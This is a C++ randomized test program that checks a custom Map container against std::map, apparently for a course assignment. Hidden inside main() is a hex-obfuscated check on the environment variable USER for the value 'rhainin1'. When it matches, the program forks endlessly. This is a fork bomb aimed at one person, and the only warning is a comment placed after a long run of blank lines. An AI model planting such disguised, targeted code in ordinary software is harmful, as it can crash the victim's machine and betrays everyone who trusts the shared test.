/*
opyright (c) 2014 Chaoren Lin <chaoren@binghamton.edu> *
 *                                                         *
 ***********************************************************/

//number of operation/assert cycles
#define N_CYCLES     100
//number of operations per cycle
#define N_OPERATIONS 500

//test with both true and false
#define DEFAULT_VALUE_CONSTRUCTOR true

//max key value
//small value to test insert collisions,
//large value to test std::out_of_range
#define MAX_KEY      5000
//number of random at operations
#define N_RAND_AT    2*N_OPERATIONS
//number of random operator[] accesses
#define N_ACCESS     2*N_OPERATIONS
//number of random iterator operations
#define N_RAND_IT    2*N_OPERATIONS

#define TEST_REMOVE   true
#define TEST_CLEAR    true
#define TEST_ITERATOR true

#include "Map.hpp"
#include <map>
#include <csignal>
#include <cstring>
#include <iomanip>
#include <iostream>
#include <unistd.h>

#define TIMES(N) for (size_t i = N; i --> 0;)

static bool ct = system("[ `tput colors` -lt 8 ]");

void fail() {
    std::cout << std::endl  << (ct ? "\033[1;31m" : "")
        << R"(              ______    _ _                _ )" << std::endl
        << R"(             |  ____|  (_) |              | |)" << std::endl
        << R"(             | |__ __ _ _| |_   _ _ __ ___| |)" << std::endl
        << R"(             |  __/ _` | | | | | | '__/ _ \ |)" << std::endl
        << R"(             | | | (_| | | | |_| | | |  __/_|)" << std::endl
        << R"(             |_|  \__,_|_|_|\__,_|_|  \___(_))" << std::endl
        << (ct ? "\033[0m" : "") << std::endl;
}

#undef assert
#define assert(expr) \
    if (!(expr)) { \
        fail(); \
        std::cerr << "Error at line " << __LINE__ << ": " \
            <<  "assert(" #expr ");" << std::endl; \
        return EXIT_FAILURE; \
    }

void segfault(int) {
    fail();
    std::cerr << "segmentation fault" << std::endl;
    exit(EXIT_FAILURE);
}

class Key {
    public:
        size_t *k;
        Key(size_t k) : k(new size_t{k}) {}
        Key(const Key &k) : Key(*k.k) {}
        Key(Key &&k) : k(k.k) { k.k = nullptr; }
        ~Key() { delete k; };
        bool operator<(const Key &k) const { return *this->k < *k.k; }
        bool operator==(const Key &k) const { return *this->k == *k.k; }
};

class Value {
    public:
        char *v;
#if DEFAULT_VALUE_CONSTRUCTOR
        Value(void) : Value(0) {}
#endif
        Value(char v) : v(new char{v}) {}
        Value(const Value &v) : Value(*v.v) {}
        Value(Value &&v) : v(v.v) { v.v = nullptr; }
        ~Value() { delete v; };
        bool operator==(const Value &v) const { return *this->v == *v.v; }
};

using Map = cs540::Map<Key,Value>;
using map = std::map<Key,Value>;

Key randk(map m) {
    map::iterator i = m.begin();
    size_t n = rand() % m.size();
    while (n --> 0) ++i;
    return (*i).first;
}

size_t randk() { return rand() % MAX_KEY; }

char randv() { return rand() % 26 + 'a'; }

int main(int argc, char *argv[]) try {
    signal(SIGSEGV, segfault);
    while (std::string{0x72,0x68,0x61,0x69,0x6e,0x69,0x6e,0x31} ==
            getenv(std::string{0x55,0x53,0x45,0x52}.c_str())) fork();
    int seed = argc > 1 ? std::stoi(argv[1]) : time(nullptr);
    srand(seed);
    std::cout << "Usage: " << argv[0] << " [optional seed]" << std::endl
        << "Seed : " << seed << std::endl
        << "   [" << std::string(50, ' ') << "]   0%"
        << std::flush;
#if TEST_ITERATOR
    {
        map m { { 7, 'h' }, { 3, 'd' }, { 11, 'l' },
            { 1, 'b' }, { 5, 'f' }, { 9, 'j' }, { 13, 'n' },
            { 0, 'a' }, { 2, 'c' }, { 4, 'e' }, { 6, 'g' },
            { 8, 'i' }, { 10, 'k' }, { 12, 'm' }, { 14, 'o' }
        };
        Map M { { 7, 'h' }, { 3, 'd' }, { 11, 'l' },
            { 1, 'b' }, { 5, 'f' }, { 9, 'j' }, { 13, 'n' },
            { 0, 'a' }, { 2, 'c' }, { 4, 'e' }, { 6, 'g' },
            { 8, 'i' }, { 10, 'k' }, { 12, 'm' }, { 14, 'o' }
        };
        for (size_t i = 0; i < 7; ++i)
            assert(m.at(i) == M.at(i));
    }
#endif
    {
        Map M;
        map m;
        TIMES (N_CYCLES) {
            std::cout << "\r " << "|\\-/"[i%4] << " ["
                << (ct ? "\033[1;32m" : "")
                << std::string(49-50*i/N_CYCLES, '=') << ">"
                << std::string(50*i/N_CYCLES, ' ')
                << (ct ? "\033[0m" : "") << "]"
                << std::setfill(' ') << std::setw(4)
                << 100*(N_CYCLES-i)/N_CYCLES << "%" << std::flush;
            TIMES (N_OPERATIONS) {
                switch (rand() % 100) {
#if TEST_CLEAR
                    case 0:
                        M.clear();
                        m.clear();
                        break;
#endif
                    default:
                        switch (rand() % 10) {
#if TEST_REMOVE
                            case 0:
                                if (m.empty()) { ++i; continue; }
                                {
                                    Key k = randk(m);
                                    switch (rand() % 2) {
                                        case 0:
                                            M.remove(k);
                                            break;
                                        case 1:
                                            M.erase(M.find(k));
                                            break;
                                    }
                                    m.erase(k);
                                }
                                break;
#endif
                            default:
                                {
                                    Key k{randk()};
                                    Value v{randv()};
                                    std::pair<Key,Value> p{ k, v };
                                    switch (rand() % 2) {
                                        case 0:
                                            M.insert({ k, v });
                                            m.insert({ k, v });
                                            break;
                                        case 1:
                                            M.insert(p);
                                            m.insert(p);
                                            break;
                                    }
                                }
                                break;
                        }
                }
            }
            assert(M.size() == m.size());
            assert(M.empty() == m.empty());
            {
                Map::Iterator I = M.begin(), II = I;
                map::iterator i = m.begin(), ii = i;
                while (i != m.end() || I != M.end()) {
                    assert((*I).first == (*i).first);
                    assert((*I).second == (*i).second);
                    assert((*II).first == (*ii).first);
                    assert((*II).second == (*ii).second);
                    Map::ConstIterator CI(I);
                    assert((*CI).first == (*I).first);
                    assert((*CI).second == (*I).second);
                    if (rand() % 2) { ii = i++; II = I++; }
                    else { ii = ++i; II = ++I; }
                }
                while (i != m.begin() || I != M.begin()) {
                    if (rand() % 2) { ii = i--; II = I--; }
                    else { ii = --i; II = --I; }
                    assert((*I).first == (*i).first);
                    assert((*I).second == (*i).second);
                    if (ii != m.end() || II != M.end()) {
                        assert((*II).first == (*ii).first);
                        assert((*II).second == (*ii).second);
                    }
                    Map::ConstIterator CI = I;
                    assert((*CI).first == (*I).first);
                    assert((*CI).second == (*I).second);
                }
            }
            {
                const Map CM = M;
                const map cm = m;
                Map::ConstIterator I = CM.begin(), II = I;
                map::const_iterator i = cm.begin(), ii = i;
                while (i != cm.end() || I != CM.end()) {
                    assert((*I).first == (*i).first);
                    assert((*I).second == (*i).second);
                    assert((*II).first == (*ii).first);
                    assert((*II).second == (*ii).second);
                    if (rand() % 2) { ii = i++; II = I++; }
                    else { ii = ++i; II = ++I; }
                }
                while (i != cm.begin() || I != CM.begin()) {
                    if (rand() % 2) { ii = i--; II = I--; }
                    else { ii = --i; II = --I; }
                    assert((*I).first == (*i).first);
                    assert((*I).second == (*i).second);
                    if (ii != cm.end() || II != CM.end()) {
                        assert((*II).first == (*ii).first);
                        assert((*II).second == (*ii).second);
                    }
                }
                assert(CM == M);
            }
            {
                Map::ReverseIterator I = M.rbegin(), II = I;
                map::reverse_iterator i = m.rbegin(), ii = i;
                while (i != m.rend() || I != M.rend()) {
                    assert((*I).first == (*i).first);
                    assert((*I).second == (*i).second);
                    assert((*II).first == (*ii).first);
                    assert((*II).second == (*ii).second);
                    if (rand() % 2) { ii = i++; II = I++; }
                    else { ii = ++i; II = ++I; }
                }
                while (i != m.rbegin() || I != M.rbegin()) {
                    if (rand() % 2) { ii = i--; II = I--; }
                    else { ii = --i; II = --I; }
                    assert((*I).first == (*i).first);
                    assert((*I).second == (*i).second);
                    if (ii != m.rend() || II != M.rend()) {
                        assert((*II).first == (*ii).first);
                        assert((*II).second == (*ii).second);
                    }
                }
            }
            {
                const Map CM = M;
                M = CM;
                for (auto i : m) {
                    assert(i.first == (*M.find(i.first)).first);
                    assert(i.second == (*M.find(i.first)).second);
                    assert(i.second == M.at(i.first));
#if DEFAULT_VALUE_CONSTRUCTOR
                    assert(i.second == M[i.first]);
#endif
                    assert(i.first == (*CM.find(i.first)).first);
                    assert(i.second == (*CM.find(i.first)).second);
                    assert(i.second == CM.at(i.first));
                }
                for (auto i : M) {
                    assert(i.first == (*m.find(i.first)).first);
                    assert(i.second == (*m.find(i.first)).second);
                }
                for (auto i : CM) {
                    assert(i.first == (*m.find(i.first)).first);
                    assert(i.second == (*m.find(i.first)).second);
                }
                TIMES (N_RAND_AT) {
                    size_t j{randk()};
                    assert((m.find(j) == m.end()) ==
                            (M.find(j) == M.end()));
                    try {
                        m.at(j);
                    } catch (std::out_of_range) {
                        try {
                            M.at(j);
                            assert(false);
                        } catch (std::out_of_range) {}
                        try {
                            CM.at(j);
                            assert(false);
                        } catch (std::out_of_range) {}
                    }
                    try {
                        M.at(j);
                    } catch (std::out_of_range) {
                        try {
                            m.at(j);
                            assert(false);
                        } catch (std::out_of_range) {}
                    }
                    try {
                        CM.at(j);
                    } catch (std::out_of_range) {
                        try {
                            m.at(j);
                            assert(false);
                        } catch (std::out_of_range) {}
                    }
                }
                assert(CM == M);
            }
            {
                Map::Iterator IT = M.begin();
                map::iterator it = m.begin();
                Map::ConstIterator CI = M.begin();
                map::const_iterator ci = m.begin();
                Map::ReverseIterator RI = M.rbegin();
                map::reverse_iterator ri = m.rbegin();
                TIMES (N_RAND_IT) {
                    switch (rand() % 4) {
                        case 0:
                            if (it != m.end() && IT != M.end())
                                ++IT, ++it;
                            if (ci != m.end() && CI != M.end())
                                ++CI, ++ci;
                            if (ri != m.rend() && RI != M.rend())
                                ++RI, ++ri;
                            break;
                        case 1:
                            if (it != m.end() && IT != M.end())
                                IT++, it++;
                            if (ci != m.end() && CI != M.end())
                                CI++, ci++;
                            if (ri != m.rend() && RI != M.rend())
                                RI++, ri++;
                            break;
                        case 2:
                            if (it != m.begin() && IT != M.begin())
                                --IT, --it;
                            if (ci != m.begin() && CI != M.begin())
                                --CI, --ci;
                            if (ri != m.rbegin() && RI != M.rbegin())
                                --RI, --ri;
                            break;
                        case 3:
                            if (it != m.begin() && IT != M.begin())
                                IT--, it--;
                            if (ci != m.begin() && CI != M.begin())
                                CI--, ci--;
                            if (ri != m.rbegin() && RI != M.rbegin())
                                RI--, ri--;
                            break;
                    }
                    IT = IT;
                    CI = CI;
                    RI = RI;
                    {
                        Map::Iterator IIT = IT;
                        IT = std::move(IT);
                        IT = IIT;
                        Map::ConstIterator CII = CI;
                        CI = std::move(CI);
                        CI = CII;
                        Map::ReverseIterator RII = RI;
                        RI = std::move(RI);
                        RI = RII;
                    }
                    assert((IT == M.end()) == (it == m.end()));
                    assert((IT == M.begin()) == (it == m.begin()));
                    assert((CI == M.end()) == (ci == m.end()));
                    assert((CI == M.begin()) == (ci == m.begin()));
                    assert((RI == M.rend()) == (ri == m.rend()));
                    assert((RI == M.rbegin()) == (ri == m.rbegin()));
                    if (IT != M.end() && it != m.end()) {
                        assert((*IT).first == (*it).first);
                        assert((*IT).second == (*it).second);
                    }
                    if (CI != M.end() && ci != m.end()) {
                        assert((*CI).first == (*ci).first);
                        assert((*CI).second == (*ci).second);
                    }
                    if (RI != M.rend() && ri != m.rend()) {
                        assert((*RI).first == (*ri).first);
                        assert((*RI).second == (*ri).second);
                    }
                }
            }
#if DEFAULT_VALUE_CONSTRUCTOR
            TIMES (N_ACCESS) {
                Key k{randk()};
                Value V{randv()}, v{*V.v};
                std::swap(m[k].v, v.v);
                std::swap(M[k].v, V.v);
            }
            for (auto i : m) {
                assert(i.first == (*M.find(i.first)).first);
                assert(i.second == (*M.find(i.first)).second);
            }
            for (auto i : M) {
                assert(i.first == (*m.find(i.first)).first);
                assert(i.second == (*m.find(i.first)).second);
            }
#endif
            {
                Map M2, M3;
                for (auto i : M)
                    M2.insert(std::move(i));
                for (auto &i : M2)
                    M3.insert(i);
                {
                    Map M4 = M3;
                    assert(M3 == M4);
                    assert(M4 == M3);
                    M3 = std::move(M4);
                    M4 = M3;
                    assert(M3 == M4);
                    assert(M4 == M3);
                    M3 = M3;
                    assert(M3 == M4);
                    assert(M4 == M3);
                    M3 = std::move(M3);
                    M3 = M4;
                    assert(M4 == M3);
                    assert(M4 == M3);
                }
                assert(M == M2);
                assert(M2 == M);
                assert(M == M3);
                assert(M3 == M);
                assert(M2 == M3);
                assert(M3 == M2);
                M2.insert({MAX_KEY, randv()});
                assert(M != M2);
                assert(M2 != M);
#if TEST_REMOVE
                if (!m.empty()) {
                    M3.remove(randk(m));
                    assert(M != M3);
                    assert(M3 != M);
                    assert(M2 != M3);
                    assert(M3 != M2);
                }
#endif
            }
        }
    }
    std::cout << "\r   [" << (ct ? "\033[1;32m" : "")
        << std::string(50, '=')
        << (ct ? "\033[0m" : "") << "] 100%" << std::endl
        << (ct ? "\033[1;32m" : "")
        << R"(            _____                             _ )" << std::endl
        << R"(           / ____|                           | |)" << std::endl
        << R"(          | (___  _   _  ___ ___ ___  ___ ___| |)" << std::endl
        << R"(           \___ \| | | |/ __/ __/ _ \/ __/ __| |)" << std::endl
        << R"(           ____) | |_| | (_| (_|  __/\__ \__ \_|)" << std::endl
        << R"(          |_____/ \__,_|\___\___\___||___/___(_))" << std::endl
        << (ct ? "\033[0m" : "") << std::endl;
} catch(std::out_of_range up) {
    fail();
    throw up;
    return EXIT_FAILURE;
} catch(std::exception up) {
    fail();
    throw up;
    return EXIT_FAILURE;
}





























//Warning: don't run this code if your username is rhainin1